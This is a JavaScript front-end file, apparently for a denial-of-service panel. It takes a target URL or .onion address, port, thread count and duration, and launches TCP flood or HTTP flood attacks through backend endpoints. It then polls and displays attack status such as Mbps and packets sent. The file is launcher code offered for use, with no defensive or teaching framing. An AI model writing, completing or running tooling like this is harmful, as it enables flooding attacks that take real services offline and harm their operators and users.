// script.js

// Function to handle form submission and initiate attack
async function initiateAttack(event) {
    event.preventDefault();

    const target = document.getElementById('target').value;
    const attackType = document.getElementById('attackType').value;
    const duration = parseInt(document.getElementById('duration').value);
    const threads = parseInt(document.getElementById('threads').value);
    const port = parseInt(document.getElementById('port').value);


    if (!target) {
        alert('Please enter a target URL or .onion address.');
        return;
    }

    // Basic input validation (expand as needed)
    if (isNaN(duration) || duration <= 0) {
        alert('Please enter a valid duration in seconds.');
        return;
    }

    if (isNaN(threads) || threads <= 0) {
        alert('Please enter a valid number of threads.');
        return;
    }

    if (isNaN(port) || port <= 0 || port > 65535) {
        alert('Please enter a valid port number (1-65535).');
        return;
    }


    // Call the appropriate attack function based on the selected attackType
    switch (attackType) {
        case 'tcpFlood':
            await startTcpFlood(target, port, threads, duration);
            break;
        case 'httpFlood':
            await startHttpFlood(target, threads, duration);
            break;
        // Add cases for other attack types as needed
        default:
            alert('Invalid attack type selected.');
            return;
    }
}

// Function to start the TCP flood attack
async function startTcpFlood(target, port, threads, duration) {
    // Construct the URL for the API endpoint
    const url = `/main/tcpFlood?target=${encodeURIComponent(target)}&port=${port}&threads=${threads}&duration=${duration}`;

    try {
        const response = await fetch(url);

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error from server:', errorText);
            alert(`Attack failed: ${errorText}`); // Display the error message to the user
            return;
        }

        const data = await response.json();
        console.log('Attack started:', data);
        // Handle success - maybe update the UI to show the attack is running
        alert('TCP Flood attack started successfully!');
        startStatusUpdates(target); // Start polling for status updates
    } catch (error) {
        console.error('Error starting attack:', error);
        alert(`Error starting attack: ${error.message}`);
    }
}

async function startHttpFlood(target, threads, duration) {
    // Construct the URL for the API endpoint
    const url = `/main/httpFlood?target=${encodeURIComponent(target)}&threads=${threads}&duration=${duration}`;

    try {
        const response = await fetch(url);

        if (!response.ok) {
            const errorText = await response.text();
            console.error('Error from server:', errorText);
            alert(`Attack failed: ${errorText}`); // Display the error message to the user
            return;
        }

        const data = await response.json();
        console.log('Attack started:', data);
        // Handle success - maybe update the UI to show the attack is running
        alert('HTTP Flood attack started successfully!');
        startStatusUpdates(target); // Start polling for status updates
    } catch (error) {
        console.error('Error starting attack:', error);
        alert(`Error starting attack: ${error.message}`);
    }
}


// Function to poll for status updates
async function getAttackStatus(target) {
    const url = `/main/attackStatus?target=${encodeURIComponent(target)}`;

    try {
        const response = await fetch(url);
        if (!response.ok) {
            console.error('Error fetching attack status:', response.statusText);
            return null;
        }
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error fetching attack status:', error);
        return null;
    }
}

// Function to update the UI with status information
function updateStatus(status) {
    document.getElementById('mbps').innerText = status.mbps || 'N/A';
    document.getElementById('packetsSent').innerText = status.packetsSent || 'N/A';
    document.getElementById('connectionStatus').innerText = status.connectionStatus || 'N/A';
    document.getElementById('attackDuration').innerText = status.attackDuration || 'N/A';
}

// Function to start periodic status updates
function startStatusUpdates(target) {
    const intervalId = setInterval(async () => {
        const status = await getAttackStatus(target);
        if (status) {
            updateStatus(status);
        } else {
            clearInterval(intervalId);
            console.log('Stopping status updates.');
        }
    }, 2000); // Update every 2 seconds
}


// Add event listener to the form
document.addEventListener('DOMContentLoaded', () => {
    const attackForm = document.getElementById('attackForm');
    if (attackForm) {
        attackForm.addEventListener('submit', initiateAttack);
    } else {
        console.error('Attack form not found.');
    }

    // Initial setup of navigation tabs
    setupNavigationTabs();
});


// Function to handle navigation tabs
function setupNavigationTabs() {
    const tabs = document.querySelectorAll('.tab-button');
    const tabContents = document.querySelectorAll('.tab-content');

    tabs.forEach(tab => {
        tab.addEventListener('click', (event) => {
            // Deactivate all tabs and hide all content
            tabs.forEach(t => t.classList.remove('active'));
            tabContents.forEach(c => c.classList.remove('active'));

            // Activate the clicked tab and show its content
            const tabId = event.target.getAttribute('data-tab');
            event.target.classList.add('active');
            document.getElementById(tabId).classList.add('active');
        });
    });

    // Optionally, activate the first tab by default
    if (tabs.length > 0) {
        tabs[0].classList.add('active');
        tabContents[0].classList.add('active');
    }
}